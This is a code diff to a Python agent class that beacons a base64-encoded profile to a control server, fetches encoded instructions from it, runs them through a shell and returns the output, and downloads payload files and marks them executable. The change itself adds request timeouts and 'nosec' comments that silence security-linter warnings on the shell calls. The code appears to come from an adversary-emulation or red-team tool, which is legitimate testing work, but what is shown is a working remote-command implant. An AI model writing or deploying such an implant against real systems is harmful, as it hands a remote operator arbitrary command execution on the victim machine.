@@ -3,7 +3,7 @@ import datetime
 import json
 import os
 import platform
-import subprocess
+import subprocess  # nosec B404
 import socket
 import time
 import stat
@@ -11,6 +11,8 @@ from base64 import b64encode, b64decode
 
 import requests
 from bs4 import BeautifulSoup
+
+REQUEST_TIMEOUT = 60
 
 
 class OperationLoop:
@@ -58,21 +60,21 @@ class OperationLoop:
         return json.loads(self._decode_bytes(instructions.contents[0]))
 
     def _send_beacon(self):
-        return requests.post(self.profile['server'], data=self._encode_string(json.dumps(self.profile)))
+        return requests.post(self.profile['server'], data=self._encode_string(json.dumps(self.profile)), timeout=REQUEST_TIMEOUT)
 
     def _execute_instruction(self, i):
         print('[+] Running instruction: %s' % i['id'])
         cmd = self._decode_bytes(i['command'])
         execution_timestamp = datetime.datetime.now().strftime('%Y-%m-%dT%H:%M:%SZ')
         try:
-            output = subprocess.check_output(cmd, shell=True, timeout=i['timeout'])
+            output = subprocess.check_output(cmd, shell=True, timeout=i['timeout'])  # nosec B602
         except subprocess.CalledProcessError as e:
             output = e.output
         return dict(output=self._encode_string(output.decode('utf-8', errors='ignore')), pid=os.getpid(), status=0, id=i['id'], agent_reported_time=execution_timestamp), i['sleep']
 
     def _download_payloads(self, payloads):
         for p in payloads:
-            r = requests.get(self.file_download_url, headers={'file': p})
+            r = requests.get(self.file_download_url, headers={'file': p}, timeout=REQUEST_TIMEOUT)
             with open(r.headers['FILENAME'], 'w') as fh:
                 fh.write(r.content.decode('utf-8'))
             os.chmod(r.headers['FILENAME'], stat.S_IXUSR ^ stat.S_IRUSR ^ stat.S_IWUSR ^ stat.S_IRGRP ^ stat.S_IWGRP)
